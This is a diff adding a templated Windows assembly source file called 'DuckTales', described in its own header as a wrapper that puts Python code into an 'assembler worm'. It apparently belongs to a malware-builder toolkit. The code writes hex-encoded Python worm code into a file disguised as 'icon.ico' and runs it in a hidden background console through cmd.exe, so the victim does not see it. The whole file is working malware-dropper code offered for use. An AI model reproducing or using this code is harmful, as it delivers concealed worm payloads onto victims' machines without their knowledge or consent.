@@ -1,0 +1,132 @@
+#!name##DuckTales
+#!types##wrapper
+#!info##It puts python code into an assembler worm (windows). The worm creates a code file and in a separate process will try to call the python code. The victim must have python installed.
+#!lang##asm
+#!globalVar##OS_EXEC##win##Target system executable
+#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!system_FLAG##[W]
+#!reqVar##DT_hide_process##'False' - Starts the process in the visible console. 'True' - Starts the process in the background without a view.##str
+#!setVar##DT_hide_process##True##str
+#!reqVar##DT_file_name##The name for the file in which the worm code will be placed.##str
+#!setVar##DT_file_name##icon.ico##str
+
+
+
+%define Error_invalid_generic 0xFFFFFFFF
+%define Generic_all_FLAG 0x10000000
+%define Generic_write_FLAG 0x40000000
+
+%define TRUE 1
+%define FALSE 0
+%define NULL 0
+{%if DT_hide_process=='True'%}
+%define VISABILITY 8000000h
+{%else%}
+%define VISABILITY 0x00000010
+{%endif%}
+
+STRUC STARTUPINFO
+.cb RESD 1
+.lpReserved RESD 1
+.lpDesktop RESD 1
+.lpTitle RESD 1
+.dwX RESD 1
+.dwY RESD 1
+.dwXSize RESD 1
+.dwYSize RESD 1
+.dwXCountChars RESD 1
+.dwYCountChars RESD 1
+.dwFillAttribute RESD 1
+.dwFlags RESD 1
+.wShowWindow RESW 1
+.cbReserved2 RESW 1
+.lpReserved2 RESD 1
+.hStdInput RESD 1
+.hStdOutput RESD 1
+.hStdError RESD 1
+ENDSTRUC
+
+STRUC PROCESS_INFO
+.hProcess RESD 1
+.hThread RESD 1
+.dwProcessId RESD 1
+.dwThreadId RESD 1
+ENDSTRUC
+
+extern _CreateProcessA@40
+extern _CreateFileA@28
+extern _CloseHandle@4
+extern _ExitProcess@4
+extern _WriteFile@20
+
+
+section .data
+    processinfo:
+        istruc PROCESS_INFO
+
+        iend
+    
+    stinfo:
+        istruc STARTUPINFO
+           
+        iend
+    
+    fpath: db "./{{DT_file_name}}", 0
+    fhandler: dd 0
+    bytes_write: dd 0
+    code: db "exec(bytes.fromhex('{{WORM_FINAL_CODE}}'))"
+    cmd: db "cmd.exe /C python {{DT_file_name}} & pause", 0
+        
+section .text
+    global _main
+    _main:
+        call CreateFile
+        call CreateProcess
+        call _Exit
+    
+    _Exit:
+        push 0
+        call _ExitProcess@4
+    
+    CreateFile:
+        push 0
+        push 80
+        push 2
+        push 0
+        push 0
+        push Generic_write_FLAG
+        push fpath
+        call _CreateFileA@28
+        
+        cmp eax, Error_invalid_generic
+        je _Exit
+        
+        mov [fhandler], eax
+        
+        push 0
+        push bytes_write
+        push {{CODE_LEN}}
+        push code
+        push dword [fhandler]
+        call _WriteFile@20
+        
+        cmp eax, 0
+        je _Exit
+        
+        push dword [fhandler]
+        call _CloseHandle@4
+        ret
+        
+    CreateProcess:
+        push processinfo
+        push stinfo
+        push dword NULL
+        push dword NULL
+        push dword VISABILITY
+        push dword FALSE
+        push dword NULL
+        push dword NULL
+        push dword cmd
+        push dword NULL
+        call _CreateProcessA@40
+        ret
